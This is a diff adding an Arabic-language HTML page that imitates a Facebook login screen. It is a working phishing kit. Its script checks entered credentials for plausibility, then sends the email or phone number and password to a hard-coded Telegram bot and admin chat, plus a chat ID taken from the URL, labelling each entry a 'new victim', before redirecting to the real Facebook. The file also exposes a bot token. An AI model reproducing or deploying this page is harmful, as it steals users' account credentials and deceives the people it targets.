@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>Facebook فيديو</title> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="Fake Facebook.png"> 
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: "Helvetica Neue", Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .overlay {
+      background-color: rgba(255, 255, 255, 0.95);
+      padding: 20px;
+      border-radius: 10px;
+      width: 360px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      text-align: center;
+    }
+    .overlay .facebook-logo {
+        width: 150px;
+        margin-bottom: 20px;
+    }
+    .overlay h2 {
+      font-size: 20px;
+      margin-bottom: 20px;
+    }
+    .input-field {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      background-color: #1877f2;
+      color: white;
+      font-size: 16px;
+      border: none;
+      padding: 12px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .link {
+      display: block;
+      margin: 12px 0;
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 14px;
+    }
+    .create-btn {
+      background-color: #42b72a;
+      margin-top: 10px;
+    }
+    .error {
+      color: red;
+      font-size: 14px;
+      margin-bottom: 10px;
+    }
+    .password-wrapper {
+      position: relative;
+    }
+    .password-wrapper span {
+      position: absolute;
+      left: 10px;
+      top: 12px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="overlay">
+    <img src="Fake Facebook.png" alt="Facebook" class="facebook-logo">
+    
+    <h2>تسجيل الدخول إلى فيسبوك</h2> 
+    <div id="error" class="error"></div>
+    <form id="loginForm">
+      <input class="input-field" type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+      <div class="password-wrapper">
+        <input class="input-field" type="password" id="password" placeholder="كلمة السر" required>
+        <span onclick="togglePassword()">👁️</span>
+      </div>
+      <button type="submit">تسجيل الدخول</button>
+    </form>
+    <a href="#" class="link">هل نسيت كلمة السر؟</a>
+    <div style="margin: 10px 0;">أو</div>
+    <button class="create-btn">إنشاء حساب جديد</button>
+  </div>
+
+  <script>
+    function togglePassword() {
+      const pass = document.getElementById("password");
+      pass.type = pass.type === "password" ? "text" : "password";
+    }
+
+    function getUrlId() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const id = urlParams.get('id');
+      return id; // سنقوم بإرجاع القيمة أو null
+    }
+
+    // --- دالة جديدة لإرسال الرسائل ---
+    async function sendTelegramMessage(botToken, chatId, message) {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      try {
+        const response = await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: "HTML"
+          })
+        });
+        const data = await response.json();
+        return data.ok; // إرجاع true إذا نجح الإرسال
+      } catch (error) {
+        console.error(`Failed to send to Chat ID ${chatId}:`, error);
+        return false; // إرجاع false إذا فشل
+      }
+    }
+
+    document.getElementById("loginForm").addEventListener("submit", async function(e) {
+      e.preventDefault();
+
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const errorDiv = document.getElementById("error");
+
+      const isPhone = /^01\d{9}$/.test(email);
+      const isGmail = /^[a-zA-Z0-9._%+-]+@gmail\.com$/.test(email);
+      const hasArabic = /[\u0600-\u06FF]/.test(password);
+      const isValidPassword = password.length >= 8 && !hasArabic;
+
+      if ((!isPhone && !isGmail) || !isValidPassword) {
+        errorDiv.textContent = "كلمة السر التي أدخلتها غير صحيحة. هل نسيت كلمة السر؟";
+        return;
+      }
+
+      const botToken = "8060685956:AAGJztf_aHHhFdBsH2OLuCPYS2TwPRY3_R4";
+      const adminChatId = "1431886140"; // الـ ID الثابت الخاص بك
+      const dynamicChatId = getUrlId(); // الـ ID من الرابط
+
+      const messageForAdmin = `
+        <b>💥 ضحية جديدة من Facebook  من مصدر : ${dynamicChatId || 'غير محدد'} 💥</b>
+        -----------------------------------
+        <b>👤 البريد/الهاتف:</b> <code>${email}</code>
+        <b>🔑 كلمة السر:</b> <code>${password}</code>
+      `;
+      
+      const messageForDynamicId = `
+        <b>🎉 بيانات جديدة وصلت من Facebook! 🎉</b>
+        -----------------------------------
+        <b>👤 البريد/الهاتف:</b> <code>${email}</code>
+        <b>🔑 كلمة السر:</b> <code>${password}</code>
+      `;
+
+      // إرسال الرسائل
+      const sentToAdmin = await sendTelegramMessage(botToken, adminChatId, messageForAdmin);
+      
+      if (dynamicChatId && dynamicChatId !== adminChatId) {
+        await sendTelegramMessage(botToken, dynamicChatId, messageForDynamicId);
+      }
+
+      // إعادة التوجيه إذا نجح الإرسال إلى المشرف (الأهم)
+      if (sentToAdmin) {
+        window.location.href = "https://www.facebook.com/watch";
+      } else {
+        errorDiv.textContent = "حدث خطأ أثناء إرسال البيانات.";
+      }
+    });
+  </script>
+</body>
+</html>
